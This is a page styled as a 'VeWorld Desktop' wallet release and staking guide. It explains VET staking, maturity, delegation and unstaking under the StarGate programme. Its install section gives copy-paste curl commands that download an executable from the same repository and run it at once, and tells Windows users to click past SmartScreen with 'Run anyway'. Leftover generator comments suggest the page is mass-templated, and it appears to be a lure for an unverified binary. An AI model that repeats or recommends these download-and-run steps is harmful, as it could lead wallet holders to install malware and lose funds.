![VeWorld Desktop](../assets/banner-article.png)

# VeChain StarGate Staking in VeWorld Desktop: VET Without an Extension

Stake VET, mature the position, then delegate it

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

VeWorld Desktop stakes VET through StarGate inside the application, so a browser extension is not required to open a position, delegate it or read its rewards. A position is minted as an NFT, matures over a fixed period, and only generates VTHO once it is delegated to an active validator.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You want to stake <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vet-in-veworld-desktop.md">VET in VeWorld Desktop</a> but the instructions you found assume a browser extension, or you have a position that matured and is producing nothing, or you cannot tell which tier your amount qualifies for.

| Step | What happens | What to check |
|---|---|---|
| Stake | VET locks, an NFT position is minted | Amount meets a tier threshold |
| Mature | A waiting period passes | Tier determines the length |
| Delegate | The position points at a validator | An active validator is chosen |
| Earn | <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md">VTHO accrues</a> to the position | Delegation still live |
| Unstake | Position leaves delegation first | Unbonding follows the validator cycle |

## Why it happens

Staking on VeChainThor changed shape with the Hayabusa upgrade, which went live on mainnet on 2 December 2025. Before it, holding VET generated VTHO passively for every holder. After it, issuance is dynamic and flows to validators and to holders who stake and delegate, with total production roughly half of what it had been.

The mechanics follow from that. Staking locks VET into a position that is represented as an NFT, which makes the position transferable and identifiable rather than a line in a database. Each tier has a minimum amount and a maturity period, and the position earns nothing while it matures. Delegation is the step that connects a position to a validator, and without it a mature position simply sits there, earning nothing however long it waits.

Delegation is also where most confusion lives. A user stakes, waits out maturity, and expects rewards; nothing arrives, because the position was never delegated. The fix is a second action rather than a second stake, and the wallet's staking view shows whether a position is delegated at all.

Validator cycles matter at exit. A delegated position has to leave delegation before it can be unstaked, and unbonding completes at the end of the validator's cycle, which may take days. A position that was never delegated can be unstaked at any time, so the two cases behave differently at precisely the moment a user is in a hurry.

## Fix

1. Open the staking view in VeWorld Desktop and check the tier thresholds before committing an amount.
2. Stake VET into the tier your amount qualifies for, and note the maturity period shown.
3. Wait for the position to mature rather than attempting to delegate early.
4. Delegate the position to an active validator, and confirm the delegation is recorded.
5. Check the position after a cycle to see VTHO accruing, and keep the validator selection current.
6. To exit, remove the delegation first, then unstake and allow the validator cycle to complete.

## If that did not work

If no rewards appear after maturity, check delegation before anything else. An undelegated position earns nothing regardless of how long it has existed.

If delegation fails, the validator may no longer be active. Choose another active validator and delegate again.

If unstaking is unavailable, the position is probably still delegated. Remove delegation first; the option appears once the position is free.

## Prevention

- Confirm delegation after every stake, since maturity alone earns nothing.
- Record the tier, the maturity date and the validator for each position.
- Expect exit to take a validator cycle, and plan around it rather than during it.
- Keep the app on the current release so staking flows match the programme's current rules.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Do I need a browser extension to stake?

No. Staking runs inside the desktop application, including delegation and the reward view.

### Why is my staked VET earning nothing?

Because the position has not been delegated to an active validator, or it is still maturing. Both states look idle from the balance side.

### What is the minimum to stake?

It depends on the tier you choose, and tiers are set by the programme rather than by the wallet. The staking view shows the thresholds before you commit an amount.

### Why does unstaking take so long?

A delegated position leaves delegation first, and unbonding completes at the end of the validator's cycle. That delay is part of the programme's design.

### Can I move a staking position to another wallet?

The position is an NFT, so it can be transferred like one. Delegation state travels with it, which is why the receiving wallet should be checked afterwards.

### Is staking a yield product?

No. It is participation in the network's issuance, with variable returns that are not promised. The wallet shows an estimate, not a rate.

### What happens if I stake below the lowest tier?

The staking view will not open a position that misses a tier minimum, because a position below the threshold has no maturity schedule to follow. Check the thresholds shown before choosing an amount.

### Can I add VET to an existing position?

A position is fixed by its stake and its tier. Adding to it means opening another position, which then has its own maturity period and its own delegation state to manage.

### Does delegating cost VTHO?

Delegation is a transaction like any other, so it pays a network fee in VTHO. That is worth budgeting for before the position starts producing anything.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Reading the staking reward figure](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-staking-rewards-figure-veworld-desktop.md)
- [Where the old node reward went](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-node-rewards-old-node-veworld-desktop.md)
- [What VTHO is and how staking produces it](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vtho-in-veworld-desktop.md)
- [What VET is and why it is the staking unit](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vet-in-veworld-desktop.md)
- [Whether a Ledger can sign staking transactions](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md)